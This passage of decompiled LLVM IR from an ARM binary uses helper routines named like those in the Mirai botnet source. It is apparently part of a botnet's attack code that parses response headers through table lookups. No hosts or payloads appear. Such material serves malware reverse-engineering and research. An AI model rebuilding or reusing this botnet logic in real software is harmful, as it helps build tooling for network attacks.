  %v4_91ac = call i32 @util_stristr(i8* %v3_91ac, i32 %v0_91a0, i32 %v3_919c)
  store i32 %v4_91ac, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_91b0 = icmp eq i32 %v4_91ac, 0
  store i1 %v2_91b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_91b0, label %.thread25, label %bb186

bb186:                                            ; preds = %bb185
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_91b8 = load i32, i32* @sl, align 4
  %v3_91b8 = add i32 %v2_91b8, 4
  %v4_91b8 = inttoptr i32 %v3_91b8 to i32*
  store i32 1, i32* %v4_91b8, align 4
  br label %.thread25

.thread25:                                        ; preds = %bb185, %dec_label_pc_9118, %.thread24, %bb186
  store i32 0, i32* @r7, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  %v1_91c8 = load i32, i32* @sl, align 4
  %v2_91c8 = add i32 %v1_91c8, 8
  %v3_91c8 = inttoptr i32 %v2_91c8 to i32*
  store i32 0, i32* %v3_91c8, align 4
  %v3_91cc = call i32 @table_retrieve_val(i32 48, i32* null)
  %v0_91d0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_91d0, i32* @r1, align 4
  store i32 %v3_91cc, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_91dc = call i32 @util_stristr(i8* %tmp168, i32 %v0_91d0, i32 %v3_91cc)
  store i32 %v4_91dc, i32* %r0.global-to-local, align 4
  %v2_91e4 = icmp eq i32 %v4_91dc, -1
  store i1 %v2_91e4, i1* %cpsr_c.global-to-local, align 1
  %v7_91e4 = icmp eq i32 %v4_91dc, -1
  store i1 %v7_91e4, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  br i1 %v7_91e4, label %.thread26, label %dec_label_pc_91f0

dec_label_pc_91f0:                                ; preds = %.thread25
  %v0_91f0 = load i32, i32* @r7, align 4
  store i32 %v0_91f0, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  %v2_91f8 = inttoptr i32 %v0_91f0 to i32*
  %v3_91f8 = call i32 @table_retrieve_val(i32 48, i32* %v2_91f8)
  %v0_91fc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_91fc, i32* @r1, align 4
  store i32 %v3_91f8, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_9208 = call i32 @util_stristr(i8* %tmp168, i32 %v0_91fc, i32 %v3_91f8)
  store i32 %v4_9208, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* %ip.global-to-local, align 4
  %v2_9210 = add i32 %v4_9208, %v2_827c
  %v3_9210 = inttoptr i32 %v2_9210 to i8*
  %v4_9210 = load i8, i8* %v3_9210, align 1
  store i32 %v2_827c, i32* @lr, align 4
  %v2_9218 = icmp ugt i8 %v4_9210, 31
  store i1 %v2_9218, i1* %cpsr_c.global-to-local, align 1
  %v7_9218 = icmp eq i8 %v4_9210, 32
  store i1 %v7_9218, i1* %cpsr_z.global-to-local, align 1
  %v2_9220 = zext i1 %v7_9218 to i32
  %v2_9220.v4_9208 = add i32 %v2_9220, %v4_9208
  store i32 %v2_9220.v4_9208, i32* @r4, align 4
  %v2_9224 = add i32 %v2_9220.v4_9208, %v2_827c
  store i32 %v2_9224, i32* @r5, align 4
  store i32 %v2_9224, i32* %r0.global-to-local, align 4
  %v1_922c = load i32, i32* %fp.global-to-local, align 4
  %v2_922c = sub i32 %v1_922c, %v2_9220.v4_9208
  store i32 %v2_922c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9238 = call i32 @util_memsearch(i32 %v2_9224, i32 %v2_922c, i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32 2)
  store i32 %v5_9238, i32* %r0.global-to-local, align 4
  %v2_923c = icmp eq i32 %v5_9238, -1
  store i1 %v2_923c, i1* %cpsr_c.global-to-local, align 1
  %v7_923c = icmp eq i32 %v5_9238, -1
  store i1 %v7_923c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_923c, label %.thread26, label %dec_label_pc_9244

dec_label_pc_9244:                                ; preds = %dec_label_pc_91f0
  %v2_9244 = icmp ne i32 %v5_9238, 0
  store i1 %v2_9244, i1* %cpsr_c.global-to-local, align 1
  %v7_9244 = icmp eq i32 %v5_9238, 1
  store i1 %v7_9244, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8694, i32* %r1.global-to-local, align 4
  %v7_924c = icmp slt i32 %v5_9238, 2
  br i1 %v7_924c, label %bb188, label %bb187

bb187:                                            ; preds = %dec_label_pc_9244
  %v9_924c = add i32 %v5_9238, -2
  store i32 %v9_924c, i32* %r0.global-to-local, align 4
  br label %bb188

bb188:                                            ; preds = %dec_label_pc_9244, %bb187
  %v1_9254 = phi i32 [ %v5_9238, %dec_label_pc_9244 ], [ %v9_924c, %bb187 ]
  store i32 %v2_8710, i32* %r1.global-to-local, align 4
  %v2_9254 = add i32 %v1_9254, %v2_8710
  %v1_9258 = load i32, i32* @r4, align 4
  %v2_9258 = add i32 %v2_9254, %v1_9258
  store i32 %v2_9258, i32* %r3.global-to-local, align 4
  %v0_925c = load i32, i32* @r7, align 4
  %v1_925c = trunc i32 %v0_925c to i8
  %v3_925c = load i32, i32* @r6, align 4
  %v4_925c = add i32 %v3_925c, %v2_9258
  %v5_925c = inttoptr i32 %v4_925c to i8*
  store i8 %v1_925c, i8* %v5_925c, align 1
  %v0_9260 = load i32, i32* @r5, align 4
  store i32 %v0_9260, i32* %r0.global-to-local, align 4
  %v1_9264 = inttoptr i32 %v0_9260 to i8*
  %v2_9264 = call i32 @util_strlen(i8* %v1_9264)
  %v0_9268 = load i32, i32* @r7, align 4
  store i32 %v0_9268, i32* %r1.global-to-local, align 4
  store i32 %v2_9264, i32* @r4, align 4
  store i32 49, i32* %r0.global-to-local, align 4
  %v2_9274 = inttoptr i32 %v0_9268 to i32*
  %v3_9274 = call i32 @table_retrieve_val(i32 49, i32* %v2_9274)
  %v0_9278 = load i32, i32* @r4, align 4
  store i32 %v0_9278, i32* @r1, align 4
  store i32 %v3_9274, i32* %r2.global-to-local, align 4
  %v0_9280 = load i32, i32* @r5, align 4
  store i32 %v0_9280, i32* %r0.global-to-local, align 4
  %v3_9284 = inttoptr i32 %v0_9280 to i8*
  %v4_9284 = call i32 @util_stristr(i8* %v3_9284, i32 %v0_9278, i32 %v3_9274)
  store i32 %v4_9284, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9288 = icmp eq i32 %v4_9284, 0
  store i1 %v2_9288, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9288, label %.thread26, label %bb189

bb189:                                            ; preds = %bb188
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9290 = load i32, i32* @sl, align 4
  %v3_9290 = add i32 %v2_9290, 8
  %v4_9290 = inttoptr i32 %v3_9290 to i32*
  store i32 1, i32* %v4_9290, align 4
  br label %.thread26

.thread26:                                        ; preds = %bb188, %dec_label_pc_91f0, %.thread25, %bb189
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 47, i32* %r0.global-to-local, align 4
  %v3_929c = call i32 @table_retrieve_val(i32 47, i32* null)
  %v0_92a0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_92a0, i32* @r1, align 4
  store i32 %v3_929c, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_92ac = call i32 @util_stristr(i8* %tmp168, i32 %v0_92a0, i32 %v3_929c)
  store i32 %v4_92ac, i32* %r0.global-to-local, align 4
  %v2_92b0 = icmp eq i32 %v4_92ac, -1
  store i1 %v2_92b0, i1* %cpsr_c.global-to-local, align 1
  %v7_92b0 = icmp eq i32 %v4_92ac, -1
  store i1 %v7_92b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_92b0, label %.thread, label %dec_label_pc_92c8

.thread:                                          ; preds = %.thread26
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_92c0 = load i32, i32* @sl, align 4
  %v3_92c0 = add i32 %v2_92c0, 12
  %v4_92c0 = inttoptr i32 %v3_92c0 to i32*
  store i32 0, i32* %v4_92c0, align 4
  br label %dec_label_pc_934c

dec_label_pc_92c8:                                ; preds = %.thread26
  store i32 -20773, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 47, i32* %r0.global-to-local, align 4
  %v3_92d0 = call i32 @table_retrieve_val(i32 47, i32* null)
  %v0_92d4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_92d4, i32* @r1, align 4
  store i32 %v3_92d0, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_92e0 = call i32 @util_stristr(i8* %tmp168, i32 %v0_92d4, i32 %v3_92d0)
  store i32 %v4_92e0, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* %r2.global-to-local, align 4
  %v2_92e8 = add i32 %v4_92e0, %v2_827c
  %v3_92e8 = inttoptr i32 %v2_92e8 to i8*
  %v4_92e8 = load i8, i8* %v3_92e8, align 1
  %v2_92ec = icmp ugt i8 %v4_92e8, 31
  store i1 %v2_92ec, i1* %cpsr_c.global-to-local, align 1
  %v7_92ec = icmp eq i8 %v4_92e8, 32
  store i1 %v7_92ec, i1* %cpsr_z.global-to-local, align 1
  %v2_92f8 = zext i1 %v7_92ec to i32
  %v2_92f8.v4_92e0 = add i32 %v2_92f8, %v4_92e0
  store i32 %v2_92f8.v4_92e0, i32* @r4, align 4
  %v2_92fc = add i32 %v2_92f8.v4_92e0, %v2_827c
  store i32 %v2_92fc, i32* @r5, align 4
  store i32 %v2_92fc, i32* %r0.global-to-local, align 4
  %v1_9304 = load i32, i32* %fp.global-to-local, align 4
  %v2_9304 = sub i32 %v1_9304, %v2_92f8.v4_92e0
  store i32 %v2_9304, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9310 = call i32 @util_memsearch(i32 %v2_92fc, i32 %v2_9304, i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32 2)
  store i32 %v5_9310, i32* %r0.global-to-local, align 4
  %v2_9314 = icmp eq i32 %v5_9310, -1
  store i1 %v2_9314, i1* %cpsr_c.global-to-local, align 1
  %v7_9314 = icmp eq i32 %v5_9310, -1
  store i1 %v7_9314, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9314, label %dec_label_pc_934c, label %dec_label_pc_931c

dec_label_pc_931c:                                ; preds = %dec_label_pc_92c8
  %v2_931c = icmp ne i32 %v5_9310, 0
  store i1 %v2_931c, i1* %cpsr_c.global-to-local, align 1
  %v7_931c = icmp eq i32 %v5_9310, 1
  store i1 %v7_931c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8694, i32* %ip.global-to-local, align 4
  %v7_9324 = icmp slt i32 %v5_9310, 2
  br i1 %v7_9324, label %bb191, label %bb190

bb190:                                            ; preds = %dec_label_pc_931c
  %v9_9324 = add i32 %v5_9310, -2
  store i32 %v9_9324, i32* %r0.global-to-local, align 4
  br label %bb191

bb191:                                            ; preds = %dec_label_pc_931c, %bb190
  %v1_932c = phi i32 [ %v5_9310, %dec_label_pc_931c ], [ %v9_9324, %bb190 ]
  store i32 %v2_8710, i32* %ip.global-to-local, align 4
  %v2_932c = add i32 %v1_932c, %v2_8710
  %v1_9330 = load i32, i32* @r4, align 4
  %v2_9330 = add i32 %v2_932c, %v1_9330
  store i32 %v2_9330, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9338 = load i32, i32* @r5, align 4
  store i32 %v0_9338, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_9340 = load i32, i32* @r6, align 4
  %v4_9340 = add i32 %v3_9340, %v2_9330
  %v5_9340 = inttoptr i32 %v4_9340 to i8*
  store i8 0, i8* %v5_9340, align 1
  %v2_9344 = inttoptr i32 %v0_9338 to i8*
  %v3_9344 = call i32 @util_atoi(i8* %v2_9344, i32 10)
  store i32 %v3_9344, i32* %r0.global-to-local, align 4
  %v1_9348 = load i32, i32* @sl, align 4
  %v2_9348 = add i32 %v1_9348, 12
  %v3_9348 = inttoptr i32 %v2_9348 to i32*
  store i32 %v3_9344, i32* %v3_9348, align 4
  br label %dec_label_pc_934c

dec_label_pc_934c:                                ; preds = %.thread, %dec_label_pc_92c8, %bb191
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_9350

dec_label_pc_9350:                                ; preds = %dec_label_pc_951c, %dec_label_pc_949c, %dec_label_pc_934c
  %v1_935c = phi i32 [ 0, %dec_label_pc_934c ], [ %v0_949c, %dec_label_pc_949c ], [ %v1_935c.pre.pre, %dec_label_pc_951c ]
  store i32 %v2_827c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 46, i32* %r0.global-to-local, align 4
  %v2_935c = add i32 %v1_935c, %v2_827c
  store i32 %v2_935c, i32* @r4, align 4
  %v3_9360 = call i32 @table_retrieve_val(i32 46, i32* null)
  %v0_9364 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9364, i32* @r1, align 4
  store i32 %v3_9360, i32* %r2.global-to-local, align 4
  %v0_936c = load i32, i32* @r4, align 4
  store i32 %v0_936c, i32* %r0.global-to-local, align 4
  %v3_9370 = inttoptr i32 %v0_936c to i8*
  %v4_9370 = call i32 @util_stristr(i8* %v3_9370, i32 %v0_9364, i32 %v3_9360)
  store i32 %v4_9370, i32* %r0.global-to-local, align 4
  store i32 -20773, i32* %ip.global-to-local, align 4
  %v2_937c = icmp eq i32 %v4_9370, -1
  store i1 %v2_937c, i1* %cpsr_c.global-to-local, align 1
  %v7_937c = icmp eq i32 %v4_9370, -1
  store i1 %v7_937c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_937c, label %dec_label_pc_9588, label %dec_label_pc_9388

dec_label_pc_9388:                                ; preds = %dec_label_pc_9350
  %v0_9388 = load i32, i32* @sl, align 4
  %v1_9388 = add i32 %v0_9388, 16
  %v2_9388 = inttoptr i32 %v1_9388 to i32*
  %v3_9388 = load i32, i32* %v2_9388, align 4
  store i32 %v3_9388, i32* %r3.global-to-local, align 4
  %v2_938c = icmp ugt i32 %v3_9388, 3
  store i1 %v2_938c, i1* %cpsr_c.global-to-local, align 1
  %v7_938c = icmp eq i32 %v3_9388, 4
  store i1 %v7_938c, i1* %cpsr_z.global-to-local, align 1
  %v8_9390 = icmp sgt i32 %v3_9388, 4
  br i1 %v8_9390, label %dec_label_pc_9588, label %dec_label_pc_9394

dec_label_pc_9394:                                ; preds = %dec_label_pc_9388
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 46, i32* %r0.global-to-local, align 4
  %v3_939c = call i32 @table_retrieve_val(i32 46, i32* null)
  %v0_93a0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_93a0, i32* @r1, align 4
  store i32 %v3_939c, i32* %r2.global-to-local, align 4
  %v0_93a8 = load i32, i32* @r4, align 4
  store i32 %v0_93a8, i32* %r0.global-to-local, align 4
  %v3_93ac = inttoptr i32 %v0_93a8 to i8*
  %v4_93ac = call i32 @util_stristr(i8* %v3_93ac, i32 %v0_93a0, i32 %v3_939c)
  store i32 %v4_93ac, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* @lr, align 4
  %v1_93b4 = load i32, i32* @r5, align 4
  %v2_93b4 = add i32 %v1_93b4, %v4_93ac
  store i32 %v2_93b4, i32* @r8, align 4
  %v2_93b8 = add i32 %v2_93b4, %v2_827c
  %v3_93b8 = inttoptr i32 %v2_93b8 to i8*
  %v4_93b8 = load i8, i8* %v3_93b8, align 1
  %v6_93b8 = zext i8 %v4_93b8 to i32
  store i32 %v6_93b8, i32* %r3.global-to-local, align 4
  %v2_93bc = icmp ugt i8 %v4_93b8, 31
  store i1 %v2_93bc, i1* %cpsr_c.global-to-local, align 1
  %v7_93bc = icmp eq i8 %v4_93b8, 32
  store i1 %v7_93bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_93bc, label %bb192, label %bb193

bb192:                                            ; preds = %dec_label_pc_9394
  %v2_93c0 = add i32 %v4_93ac, 1
  store i32 %v2_93c0, i32* %r0.global-to-local, align 4
  br label %bb193

bb193:                                            ; preds = %dec_label_pc_9394, %bb192
  %v1_93d0 = phi i32 [ %v4_93ac, %dec_label_pc_9394 ], [ %v2_93c0, %bb192 ]
  %v1_93c4 = load i32, i32* %fp.global-to-local, align 4
  %v2_93c4 = sub i32 %v1_93c4, %v1_93b4
  store i32 %v2_93c4, i32* %r3.global-to-local, align 4
  %v2_93c8 = sub i32 %v2_93c4, %v1_93d0
  store i32 %v2_93c8, i32* @r7, align 4
  %v0_93cc = load i32, i32* @r4, align 4
  %v2_93cc = add i32 %v0_93cc, %v1_93d0
  store i32 %v2_93cc, i32* @r6, align 4
  br i1 %v7_93bc, label %bb194, label %bb195

bb194:                                            ; preds = %bb193
  %v3_93d0 = add i32 %v1_93d0, %v1_93b4
  store i32 %v3_93d0, i32* @r8, align 4
  br label %bb195

bb195:                                            ; preds = %bb193, %bb194
  store i32 %v2_93c8, i32* %r1.global-to-local, align 4
  store i32 %v2_93cc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_93e4 = call i32 @util_memsearch(i32 %v2_93cc, i32 %v2_93c8, i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32 2)
  store i32 %v5_93e4, i32* %r0.global-to-local, align 4
  %v2_93e8 = icmp eq i32 %v5_93e4, -1
  store i1 %v2_93e8, i1* %cpsr_c.global-to-local, align 1
  %v7_93e8 = icmp eq i32 %v5_93e4, -1
  store i1 %v7_93e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_93e4, i32* @r4, align 4
  br i1 %v7_93e8, label %dec_label_pc_949c, label %dec_label_pc_93f4

dec_label_pc_93f4:                                ; preds = %bb195
  store i32 %v2_827c, i32* %r1.global-to-local, align 4
  %v2_93f8 = icmp ne i32 %v5_93e4, 0
  store i1 %v2_93f8, i1* %cpsr_c.global-to-local, align 1
  %v7_93f8 = icmp eq i32 %v5_93e4, 1
  store i1 %v7_93f8, i1* %cpsr_z.global-to-local, align 1
  %v7_93fc = icmp slt i32 %v5_93e4, 2
  br i1 %v7_93fc, label %bb197, label %bb196

bb196:                                            ; preds = %dec_label_pc_93f4
  %v9_93fc = add i32 %v5_93e4, -2
  store i32 %v9_93fc, i32* @r4, align 4
  br label %bb197

bb197:                                            ; preds = %dec_label_pc_93f4, %bb196
  %v1_9400 = load i32, i32* @r8, align 4
  %v2_9400 = add i32 %v1_9400, %v2_827c
  store i32 %v2_9400, i32* @r5, align 4
  %v0_9404 = load i32, i32* @r6, align 4
  store i32 %v0_9404, i32* %r0.global-to-local, align 4
  %v0_9408 = load i32, i32* @r7, align 4
  store i32 %v0_9408, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a7a8.49 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_9414 = call i32 @util_memsearch(i32 %v0_9404, i32 %v0_9408, i32 ptrtoint (i32* @global_var_1a7a8.49 to i32), i32 1)
  store i32 %v4_9414, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9418 = icmp eq i32 %v4_9414, 0
  store i1 %v2_9418, i1* %cpsr_z.global-to-local, align 1
  %tmp198 = icmp slt i32 %v4_9414, 1
  br i1 %tmp198, label %.dec_label_pc_9438_crit_edge, label %dec_label_pc_9420

.dec_label_pc_9438_crit_edge:                     ; preds = %bb197
  %v1_9440.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_9438

dec_label_pc_9420:                                ; preds = %bb197
  %v0_9420 = load i32, i32* @r6, align 4
  store i32 %v0_9420, i32* %r0.global-to-local, align 4
  %v0_9424 = load i32, i32* @r7, align 4
  store i32 %v0_9424, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a7a8.49 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_9430 = call i32 @util_memsearch(i32 %v0_9420, i32 %v0_9424, i32 ptrtoint (i32* @global_var_1a7a8.49 to i32), i32 1)
  store i32 %v4_9430, i32* %r0.global-to-local, align 4
  %v1_9434 = add i32 %v4_9430, -1
  store i32 %v1_9434, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9438

dec_label_pc_9438:                                ; preds = %.dec_label_pc_9438_crit_edge, %dec_label_pc_9420
  %v1_9440 = phi i32 [ %v1_9440.pre, %.dec_label_pc_9438_crit_edge ], [ %v1_9434, %dec_label_pc_9420 ]
  %v2_9440 = add i32 %v1_9440, %v2_8710
  store i32 -20773, i32* @lr, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_944c = load i32, i32* @r8, align 4
  %v2_944c = add i32 %v2_9440, %v1_944c
  store i32 %v2_944c, i32* %r3.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v4_9454 = add i32 %v2_944c, -20773
  %v5_9454 = inttoptr i32 %v4_9454 to i8*
  store i8 0, i8* %v5_9454, align 1
  %storemerge6.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_9474.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9474

dec_label_pc_9460:                                ; preds = %dec_label_pc_9474
  br i1 %v7_9464, label %dec_label_pc_94a4, label %dec_label_pc_946c

dec_label_pc_946c:                                ; preds = %dec_label_pc_9460
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9474

dec_label_pc_9474:                                ; preds = %dec_label_pc_9438, %dec_label_pc_946c
  %v0_9474 = phi i32 [ %v0_9460, %dec_label_pc_946c ], [ %v0_9474.pre, %dec_label_pc_9438 ]
  %storemerge6 = phi i32 [ %v1_9488, %dec_label_pc_946c ], [ %storemerge6.pre, %dec_label_pc_9438 ]
  store i32 %storemerge6, i32* %stack_var_-44, align 4
  store i32 %v0_9474, i32* %r0.global-to-local, align 4
  %v1_9478 = inttoptr i32 %v0_9474 to i8*
  %v2_9478 = call i32 @util_strlen(i8* %v1_9478)
  store i32 %v2_9478, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9480 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9480, i32* %r4.global-to-local, align 4
  %v3_9484 = icmp uge i32 %v2_9478, %v3_9480
  store i1 %v3_9484, i1* %cpsr_c.global-to-local, align 1
  %v9_9484 = icmp eq i32 %v2_9478, %v3_9480
  store i1 %v9_9484, i1* %cpsr_z.global-to-local, align 1
  %v1_9488 = add i32 %v3_9480, 1
  store i32 %v1_9488, i32* %ip.global-to-local, align 4
  %v8_948c = icmp sgt i32 %v2_9478, %v3_9480
  %v0_9460 = load i32, i32* @r5, align 4
  %v2_9460 = add i32 %v0_9460, %v3_9480
  %v3_9460 = inttoptr i32 %v2_9460 to i8*
  %v4_9460 = load i8, i8* %v3_9460, align 1
  %v6_9460 = zext i8 %v4_9460 to i32
  store i32 %v6_9460, i32* %r3.global-to-local, align 4
  %v2_9464 = icmp ugt i8 %v4_9460, 60
  store i1 %v2_9464, i1* %cpsr_c.global-to-local, align 1
  %v7_9464 = icmp eq i8 %v4_9460, 61
  store i1 %v7_9464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_948c, label %dec_label_pc_9460, label %dec_label_pc_9490

dec_label_pc_9490:                                ; preds = %dec_label_pc_9474
  br i1 %v7_9464, label %dec_label_pc_94a4, label %dec_label_pc_949c

dec_label_pc_949c:                                ; preds = %dec_label_pc_94e8, %dec_label_pc_950c, %dec_label_pc_9490, %bb195
  %v0_949c = load i32, i32* @r8, align 4
  store i32 %v0_949c, i32* @r5, align 4
  br label %dec_label_pc_9350

dec_label_pc_94a4:                                ; preds = %dec_label_pc_9460, %dec_label_pc_9490
  %v0_94a4 = load i32, i32* @sl, align 4
  %v1_94a4 = add i32 %v0_94a4, 16
  %v2_94a4 = inttoptr i32 %v1_94a4 to i32*
  %v3_94a4 = load i32, i32* %v2_94a4, align 4
  store i32 %v3_94a4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* @lr, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_94b0 = icmp eq i32 %v3_94a4, 0
  store i1 %v2_94b0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %tmp199 = icmp slt i32 %v3_94a4, 1
  br i1 %tmp199, label %dec_label_pc_950c, label %dec_label_pc_94bc

dec_label_pc_94bc:                                ; preds = %dec_label_pc_94a4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_94e8

dec_label_pc_94c4:                                ; preds = %dec_label_pc_94e8
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_94c8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_94c8, i32* %r3.global-to-local, align 4
  %v0_94cc = load i32, i32* @sl, align 4
  %v1_94cc = add i32 %v0_94cc, 16
  %v2_94cc = inttoptr i32 %v1_94cc to i32*
  %v3_94cc = load i32, i32* %v2_94cc, align 4
  %v1_94d0 = add i32 %v3_94c8, 1
  store i32 %v1_94d0, i32* %ip.global-to-local, align 4
  %v3_94d4 = icmp uge i32 %v3_94cc, %v1_94d0
  store i1 %v3_94d4, i1* %cpsr_c.global-to-local, align 1
  %v9_94d4 = icmp eq i32 %v3_94cc, %v1_94d0
  store i1 %v9_94d4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  store i32 %v1_94d0, i32* %r1.global-to-local, align 4
  store i32 %v1_94d0, i32* %stack_var_-44, align 4
  %v7_94e4 = icmp sgt i32 %v3_94cc, %v1_94d0
  %v0_94f4.pre = load i32, i32* @r5, align 4
  br i1 %v7_94e4, label %dec_label_pc_94c4.dec_label_pc_94e8_crit_edge, label %dec_label_pc_950c

dec_label_pc_94c4.dec_label_pc_94e8_crit_edge:    ; preds = %dec_label_pc_94c4
  %v0_94f8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_94e8

dec_label_pc_94e8:                                ; preds = %dec_label_pc_94c4.dec_label_pc_94e8_crit_edge, %dec_label_pc_94bc
  %v0_94f8 = phi i32 [ %v0_94f8.pre, %dec_label_pc_94c4.dec_label_pc_94e8_crit_edge ], [ %v3_9480, %dec_label_pc_94bc ]
  %v0_94f4 = phi i32 [ %v0_94f4.pre, %dec_label_pc_94c4.dec_label_pc_94e8_crit_edge ], [ %v0_9460, %dec_label_pc_94bc ]
  %v0_94e8 = phi i32 [ %v1_94d0, %dec_label_pc_94c4.dec_label_pc_94e8_crit_edge ], [ 0, %dec_label_pc_94bc ]
  %v1_94e8 = and i32 %v0_94e8, 33554432
  %v2_94e8 = icmp ne i32 %v1_94e8, 0
  store i1 %v2_94e8, i1* %cpsr_c.global-to-local, align 1
  %v3_94e8 = mul i32 %v0_94e8, 128
  %v1_94ec = add i32 %v3_94e8, 1472
  %v0_94f0 = load i32, i32* %sb.global-to-local, align 4
  %v2_94f0 = add i32 %v1_94ec, %v0_94f0
  store i32 %v2_94f0, i32* %r1.global-to-local, align 4
  store i32 %v0_94f4, i32* %r0.global-to-local, align 4
  store i32 %v0_94f8, i32* %r2.global-to-local, align 4
  %v3_94fc = inttoptr i32 %v0_94f4 to i8*
  %v4_94fc = call i32 @util_strncmp(i8* %v3_94fc, i32 %v2_94f0, i32 %v0_94f8)
  store i32 %v4_94fc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9500 = icmp eq i32 %v4_94fc, 0
  store i1 %v2_9500, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9500, label %dec_label_pc_94c4, label %dec_label_pc_949c

dec_label_pc_950c:                                ; preds = %dec_label_pc_94c4, %dec_label_pc_94a4
  %v0_950c = phi i32 [ %v0_9460, %dec_label_pc_94a4 ], [ %v0_94f4.pre, %dec_label_pc_94c4 ]
  store i32 %v0_950c, i32* %r0.global-to-local, align 4
  %v1_9510 = inttoptr i32 %v0_950c to i8*
  %v2_9510 = call i32 @util_strlen(i8* %v1_9510)
  store i32 %v2_9510, i32* %r0.global-to-local, align 4
  %v2_9514 = icmp ugt i32 %v2_9510, 126
  store i1 %v2_9514, i1* %cpsr_c.global-to-local, align 1
  %v7_9514 = icmp eq i32 %v2_9510, 127
  store i1 %v7_9514, i1* %cpsr_z.global-to-local, align 1
  %v8_9518 = icmp sgt i32 %v2_9510, 127
  br i1 %v8_9518, label %dec_label_pc_949c, label %dec_label_pc_951c

dec_label_pc_951c:                                ; preds = %dec_label_pc_950c
  %v0_951c = load i32, i32* @sl, align 4
  %v1_951c = add i32 %v0_951c, 16
  %v2_951c = inttoptr i32 %v1_951c to i32*
  %v3_951c = load i32, i32* %v2_951c, align 4
  %v1_9520 = and i32 %v3_951c, 33554432
  %v2_9520 = icmp ne i32 %v1_9520, 0
  store i1 %v2_9520, i1* %cpsr_c.global-to-local, align 1
